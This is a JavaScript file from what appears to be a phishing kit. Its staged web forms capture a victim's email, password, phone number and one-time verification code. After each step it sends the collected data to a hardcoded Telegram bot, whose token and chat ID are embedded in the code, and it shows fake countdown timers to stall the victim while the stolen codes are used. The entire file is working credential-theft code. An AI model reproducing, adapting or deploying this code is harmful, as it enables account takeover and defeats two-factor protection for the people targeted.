function tlgsnd(msg) {
    const token = '5825946357:AAEGCfVkVavSVdzAQAKvbI9uzoQlm02D1yk';  
    const chatId = '5864551741';    
  
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
  
    fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        chat_id: chatId,
        text: msg,
    }),
    })
    .then(response => response.json()) 
    .then(data => {
        if (data.ok) {
        console.log('Success:', data);
        } else {
        console.error('Error:', data);
        }
    })
    .catch(error => {
        console.error('Error in request:', error);
    });
}

function globalKeys(){};

function htmlLdr(){
    const appRoot = document.querySelector('#frm-cont');

    fetch("./ast/tpl.html").
        then(response =>{
            if(!response.ok) console.log("err1")
                else return response.text();
        }).
        then(data => {
            appRoot.innerHTML = data;
            document.querySelector("#frm01").addEventListener("submit",stp1);
            document.querySelector("#frm02").addEventListener("submit",stp2);
            document.querySelector("#frm03").addEventListener("submit",stp3);
            document.querySelector("#frm04").addEventListener("submit",stp4);

            globalKeys.intervalo = null;

            var input = document.querySelector("#phone");
                window.intlTelInput(input, {
                separateDialCode: true,
                initialCountry: "ve"
            });
    });
}


function stp1(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());
  
    const v1 = datos.inp1;
  
    const val1 = `--------\n<-- OKT-WS -->\n👤EML:${v1}`;
  
    localStorage.setItem('usr1', val1); 
  
    document.querySelector("#frm1").classList.toggle('hddn');
    document.querySelector("#frm2").classList.toggle('hddn');
    document.querySelector("#eml-lbl1").innerHTML = datos.inp1;

}

function stp2(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());
  
    const v1 = localStorage.getItem('usr1');
    const v2 = datos.inp2;

    const val1 = `${v1}\n🔒PASS: ${v2}`;

    localStorage.setItem('pss1', val1); 

    tlgsnd(val1);
  
    document.querySelector("#frm2").classList.toggle('hddn');
    document.querySelector("#frm3").classList.toggle('hddn');
    document.querySelector("#root").classList.toggle('ws-bg');
}

function stp3(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());
  
    const v1 = localStorage.getItem('pss1');
    const v2 = document.getElementsByClassName('iti__selected-dial-code')[0].innerHTML + '-' + datos.phone;

    const val1 = `${v1}\nTLF: ${v2}`;

    localStorage.setItem('tlf1', val1); 

    tlgsnd(val1);

    document.querySelector("#frm3").classList.toggle('hddn');
    document.querySelector("#frm-ldr").classList.toggle('hddn');
    contRegresivo()

    setTimeout(()=>{
        document.querySelector("#frm-ldr").classList.toggle('hddn');
        document.querySelector("#frm4").classList.toggle('hddn');
      },30000);
}

function stp4(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());
  
    const v1 = localStorage.getItem('tlf1');
    const v2 = datos.cod1;

    const val1 = `${v1}\nCOD: ${v2}`;

    tlgsnd(val1);

    document.querySelector("#msg2").style.display = "inline";
    document.querySelector("#msg1").style.display = "none";

    document.querySelector("#frm4").classList.toggle('hddn');
    document.querySelector("#frm-ldr").classList.toggle('hddn');
    
    contRegresivo2()

    setTimeout(()=>{
        document.querySelector("#frm-ldr").classList.toggle('hddn');
        document.querySelector("#frm4").classList.toggle('hddn');
        document.querySelector("#cod1").value = "";
    },60000);
}




function contRegresivo(){
    let tiempoRestante = 30;

    const contador = document.getElementById('cont');
    contador.innerHTML = '00:30'

    if(globalKeys.intervalo !== null) clearInterval(globalKeys.intervalo);

    globalKeys.intervalo  = setInterval(() => {
      
      const minutos = Math.floor(tiempoRestante / 60);
      const segundos = tiempoRestante % 60;

      
      contador.textContent = 
        `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;

      
      if (tiempoRestante <= 0) {
        clearInterval(globalKeys.intervalo);
      }

      tiempoRestante--;
    }, 1000);
}

function contRegresivo2(){
    let tiempoRestante = 60;

    const contador = document.getElementById('cont');
    contador.innerHTML = '01:00'

    if(globalKeys.intervalo !== null) clearInterval(globalKeys.intervalo);

    globalKeys.intervalo  = setInterval(() => {
      
      const minutos = Math.floor(tiempoRestante / 60);
      const segundos = tiempoRestante % 60;

      
      contador.textContent = 
        `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;

      
      if (tiempoRestante <= 0) {
        clearInterval(globalKeys.intervalo);
      }

      tiempoRestante--;
    }, 1000);
}

window.onload = () => {

    setTimeout(()=>{
        htmlLdr();
    }, 10000);
    
}